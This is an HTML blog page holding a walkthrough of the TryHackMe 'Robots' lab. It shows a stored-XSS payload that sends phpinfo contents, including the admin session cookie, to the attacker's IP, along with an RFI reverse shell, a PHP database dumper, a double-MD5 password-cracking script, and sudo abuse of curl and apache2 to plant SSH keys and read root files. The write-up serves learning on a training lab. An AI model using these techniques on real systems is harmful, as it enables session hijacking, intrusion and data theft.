@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Offensive security writeups, penetration testing labs, and CTF walkthroughs focused on web, network, and privilege escalation techniques.">
+    <meta name="keywords" content="penetration testing, pentesting, OSCP, TryHackMe writeups, HackTheBox, CTF, cybersecurity, ethical hacking">
+    <meta name="author" content="xlondra">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="Pentest Writeups & Security Notes">
+    <meta property="og:description" content="Offensive security lab writeups and CTF walkthroughs.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://xlondra.github.io">
+    <title>Lab name - Writeup</title>
+    
+    <link rel="stylesheet" href="../../../assets/css/writeup.css">
+    <link rel="stylesheet" href="../../../assets/css/global.css">
+    <link rel="stylesheet" href="../../../assets/css/index.css">
+    <link rel="stylesheet" href="../../../assets/css/code.css">
+    <link rel="stylesheet" href="../../../assets/css/explain.css">
+
+    <script src="../../../assets/js/footer.js" defer></script>
+    <script src="../../../assets/js/zoomer.js" defer></script>
+</head>
+<body>
+    <nav>
+        <div class="terminal">
+            <span class="prompt">londra@kali $> </span>
+            <span class="typed"></span><span class="cursor">_</span>
+        </div>
+        <div>
+            <a href="../../../index.html">Home</a>
+            <a href="../../../writeuplist.html">Writeups</a>
+            <a href="../../../contact.html">Contact</a>
+        </div>
+    </nav>
+
+    <main>
+        <article class="writeup">
+            <header class="lab-header">
+                <h1 class="lab-title">TryHackMe - Robots - Walktrough</h1>
+
+                <ul class="lab-meta">
+                    <li><strong>Date:</strong> 2026-03-19</li>
+                    <li><strong>Platform:</strong> TryHackMe</li>
+                    <li><strong>Difficulty:</strong> Hard</li>
+                    <li><strong>Lab:</strong> <a href="https://tryhackme.com/room/robots">Open Lab</a></li>
+                    <li><strong>Tags:</strong>
+                        <span class="tag">XSS</span>
+                        <span class="tag">SSH</span>
+                        <span class="tag">Linux</span>
+                        <span class="tag">RFI</span>
+                    </li>
+                </ul>
+            </header>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Reconnaissance</h2>
+                <p>I added the target IP to <b>/etc/hosts</b></p>
+                <p>We begin with a full port scan:</p>
+                <img src="images/nmap1.png" class="lab-image zoomable">
+
+                <pre><code>└─$ sudo nmap -p- robots.thm</code></pre>
+
+                <p>Next, I performed a version scan to identify running services</p>
+                <img src="images/nmap2.png" class="lab-image zoomable">
+            </section>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Enumeration</h2>
+
+                <p>Ports <b>80</b> and <b>9000</b> were open and hosting web services.</p><br>
+                <p>Port 80 returned a forbidden response<br>
+                    Port 9000 displayed the default Apache page<br>
+                    Given the room name robots, I immediately checked:
+                </p>
+                <span class="path">http://robots.thm/robots.txt</span>
+                <img src="images/robots.txt.png" class="lab-image zoomable">
+                <p>It revealed multiple hidden paths.</p>
+
+                <p>The last endpoint was accesible</p>
+                <span class="path">http://robots.thm/harm/to/self/</span>
+                <p>This page contained a registration form.</p>
+                
+                <img src="images/registerLondra.png" class="lab-image zoomable">
+                <p>So the password will be the username + day and month.<br> I generated the MD5 hash (The password) using:</p>
+                <img src="images/md5hashpassword.png" class="lab-image zoomable">
+                <code><pre>└─$ python3 -c "import hashlib; print(hashlib.md5('londraddmm'.encode()).hexdigest())"</pre></code>
+
+                <p>I then tried to use javascript as username</p>
+                <img src="images/xss.png" class="lab-image zoomable">
+
+                <p>It worked, confirming a stored XSS vulnerability.</p>
+                <img src="images/xssSuccess.png" class="lab-image zoomable">
+
+                <p>An admin is actively monitoring new user registrations. The PHPSESSID session cookie currently set is marked HttpOnly, so JavaScript can’t touch it. Fortunately, the phpinfo() page is exposed at:
+                </p>
+                <span class="path">http://robots.thm/harm/to/self/server_info.php</span>
+                <p>The PHPSESSID is exposed in this file. If we fetch it, encode it to base64, and send it to our server, we may be able to hijack the admin’s session.</p>
+                <p>I wrote a simple JavaScript payload and used it as the username:</p>
+                <pre><code>&lt;script&gt;fetch('/harm/to/self/server_info.php').then(response =&gt; response.text()).then(data =&gt; {fetch("http://192.168.169.133:8000/" + btoa(data));});&lt;/script&gt;</code></pre>
+
+                <p>Started a netcat listener on port 8000 and send the output to a file</p>
+                <pre><code>└─$ nc -nvlp 8000 > output</code></pre>
+                <p>When the admin executed my code, the content of phpinfo was send to netcat<br>
+                    I then decoded the base64 stored in <b>output</b><br>
+                    Note that you have to remove some http headers in order to decode<br>
+                </p>
+                <pre><code>└─$ cat output | base64 -d | grep PHPSESSID</code></pre>
+
+                <img src="images/SSID.png" class="lab-image zoomable">
+                <p>We can now hijack the admin's session by replacing our PHPSESSID with theirs</p>
+
+                <p>I scanned <b>http://robots.thm/harm/to/self/</b> with gobuster: </p>
+                <img src="images/admin.php.png" class="lab-image zoomable">
+
+                <p>Inspecting admin.php reveals the following:</p>
+                <img src="images/testurl.png" class="lab-image zoomable">
+            </section>
+
+            <section class="writeup-section">
+            <h2 class="section-title">Exploitation</h2>
+
+            <p>
+            After some manual probing, I uploaded a PHP reverse shell.<br>
+            I hosted it locally on port 7000.<br>
+            A netcat listener was running on port 4444.<br>
+            Then I uploaded the following file:
+            </p>
+
+            <span class="path">http://192.168.169.133:7000/php-reverse-shell.php</span>
+
+            <p>Reverse shell achieved:</p>
+            <img src="images/reverseShell.png" class="lab-image zoomable">
+
+            <p>This is a classic RFI vulnerability</p>
+
+            <p>To stabilize the session, I tried:</p>
+            <pre><code>python3 -c "import pty; pty.spawn('/bin/bash')"</code></pre>
+
+            <p>Python was unavailable, likely because this is a Docker container, as shown in phpinfo():</p>
+            <img src="images/dockerinfo.png" class="lab-image zoomable">
+
+            <p>Further inspection revealed <b>config.php:</b></p>
+            <span class="path">/var/www/html/harm/to/self/config.php</span>
+
+            <p>This exposed database credentials. I reused them to build a PHP script that dumps all databases, and uploaded it using the same method as the reverse shell.</p>
+<details class="code-block">
+<summary>Database extractor (PHP)</summary>
+<pre><code>&lt;?php
+try {
+    $pdo = new PDO("mysql:host=db", "robots", "PASSWORD_HERE");
+    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+    echo "&lt;h1&gt;Databases&lt;/h1&gt;";
+
+    $databases = $pdo->query("SHOW DATABASES")->fetchAll(PDO::FETCH_COLUMN);
+
+    foreach ($databases as $db) {
+        if (in_array($db, ['information_schema', 'performance_schema'])) {
+            continue;
+        }
+
+        echo "&lt;h2>Database: $db&lt;/h2&gt;";
+
+        // Select DB
+        $pdo->exec("USE `$db`");
+
+        $tables = $pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
+
+        foreach ($tables as $table) {
+            echo "&lt;h3&gt;Table: $table&lt;/h3&gt;";
+
+            try {
+                $stmt = $pdo->query("SELECT * FROM `$table`");
+                $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
+
+                if (!$rows) {
+                    echo "No data&lt;br&gt;";
+                    continue;
+                }
+
+                foreach ($rows as $row) {
+                    echo "&lt;pre&gt;";
+                    print_r($row);
+                    echo "&lt;/pre&gt;";
+                }
+
+            } catch (Exception $e) {
+                echo "Error reading table: " . $e->getMessage() . "&lt;br&gt;";
+            }
+        }
+    }
+} catch (PDOException $e) {
+    echo "Connection failed: " . $e->getMessage();
+}
+?&gt;
+</code></pre>
+</details>
+                <p>This revealed a new user:</p>
+                <img src="images/newuserHash.png" class="lab-image zoomable">
+
+                <p>After writing a script to crack the hash, I got no results.<br>
+                So I attempted double hashing and wrote the following script:</p>
+
+                <details class="code-block">
+<summary>Password Cracker (BASH)</summary>
+<pre><code>#!/bin/bash
+
+target="HASH_HERE"
+user="rgiskard"
+year=2026
+
+for month in {1..12}; do
+days=$(date -d "$year-$month-01 +1 month -1 day" +%d)
+  for day in $(seq 1 "$days"); do
+	dd=$(printf "%02d" "$day")
+	mm=$(printf "%02d" "$month")
+
+	input="${user}${dd}${mm}"
+	hash=$(echo -n "$input" | md5sum | awk '{print $1}' | xargs echo -n | md5sum | awk '{print $1}')
+
+	if [[ "$hash" == "$target" ]]; then
+	   	  echo "Password found!"
+	   	  echo "DD/MM: $dd$mm"
+	   	  echo "UserPass: rgiskard:$(echo -n "$input" | md5sum | awk '{print $1}')"
+	   	  exit 0
+	fi
+  done	
+done
+</code></pre>
+</details>
+            <p>I successfully retrieved the password using the script:</p>
+            <img src="images/crackedHash.png" class="lab-image zoomable">
+
+            <p>With the recovered password, I was able to log into the SSH server:</p>
+            <img src="images/sshLogin.png" class="lab-image zoomable">
+            <pre><code>└─$ ssh rgiskard@robots.thm</code></pre>
+
+            <p>I found three users on the system:</p>
+            <ul>
+                <li>dolivaw</li>
+                <li>rgiskard</li>
+                <li>vagrant</li>
+            </ul>
+
+            <p>No flag was found in the <b>rgiskard</b> directory.</p>
+            <p>A quick <b>sudo -l</b> revealed my current privileges:</p>
+            <img src="images/sudominl.png" class="lab-image zoomable">
+
+            <p>We can execute curl as user <b>dolivaw</b> although it is limited to 127.0.0.1</p>
+            <p>After some trial and error I crafted the following curl command:</p>
+            <pre><code>sudo -u dolivaw /usr/bin/curl 127.0.0.1/ -K /tmp/read</code></pre>
+
+            <p>To make the command work, I created the following file:</p>
+            <pre><code>nano /tmp/read</code></pre>
+            <p>Then I added this line:</p>
+            <span class="path">url = "file:///home/dolivaw/user.txt"</span>
+
+            <p>And upon executing:</p>
+            <img src="images/firstflag.png" class="lab-image zoomable">
+
+            <p>Ultimately I want to login as user <b>dolivaw</b>. So I executed the following chain of commands:</p>
+            <pre><code>cd /tmp && ssh-keygen -t rsa -b 4096</code></pre>
+            <pre><code>cat id_rsa.pub > authorized_keys</code></pre>
+            <pre><code>sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///tmp/authorized_keys -o /home/dolivaw/.ssh/authorized_keys</code></pre>
+            <details class="command-explanation">
+                <summary>What this command does</summary>
+
+                <ul>
+                    <li>sudo -u dolivaw : runs the command as user dolivaw</li>
+                    <li>/usr/bin/curl   : HTTP/file transfer tool used to fetch or send data</li>
+                    <li>127.0.0.1/      : target web server running locally (Apache on the machine)</li>
+                    <li>file:///tmp/authorized_keys : local file read via curl using the file protocol</li>
+                    <li>-o /home/dolivaw/.ssh/authorized_keys : writes the same output to the SSH authorized_keys file</li>
+                </ul>
+
+                <p>
+                    This command abuses curl’s ability to both fetch remote content and read local files.<br>
+                    It connects to a local web server (127.0.0.1) while also referencing a local file via the file:// protocol.<br><br>
+
+                    The key abuse comes from the <b>-o</b> flag, which allows writing the response body to arbitrary file paths.<br>
+                    If executed with sufficient privileges, this can overwrite sensitive files such as SSH authorized_keys.<br><br>
+
+                    In this case, the goal is to inject a public SSH key into the authorized_keys file,<br>
+                    enabling passwordless SSH authentication for the target user.
+                </p>
+            </details>
+            <br>
+            <pre><code>python3 -m http.server 8080</code></pre>
+
+            <p>On the attack box, I ran:</p>
+            <pre><code>└─$ wget robots.thm:8080/id_rsa</code></pre>
+
+            <p>Then I logged in as <b>dolivaw</b>:</p>
+            <pre><code>└─$ chmod 600 id_rsa && ssh -i id_rsa dolivaw@robots.thm</code></pre>
+
+            <p>This granted access as <b>dolivaw</b>:</p>
+            <img src="images/dolivawssh.png" class="lab-image zoomable">
+
+            <p>First step was checking privileges:</p>
+            <img src="images/sudominldolivaw.png" class="lab-image zoomable">
+
+            <p><b>apache2</b> can be run as root without a password. Since it doesn’t properly expose file contents and instead leaks data through error output, I crafted a command to extract the root flag:</p>
+
+            <pre><code>sudo /usr/sbin/apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /root/root.txt'</code></pre>
+            <p>And with success:</p>
+            <img src="images/rootflag.png" class="lab-image zoomable">
+        </section>
+        <p>That's it, we got the root flag.</p>
+        <p>Thank you for reading.<br>I hope you learned something new today.</p>
+        </article>
+    </main>
+    
+    <footer>
+        Copyleft &copy; <span id="year"></span>
+    </footer>
+</body>
+</html>
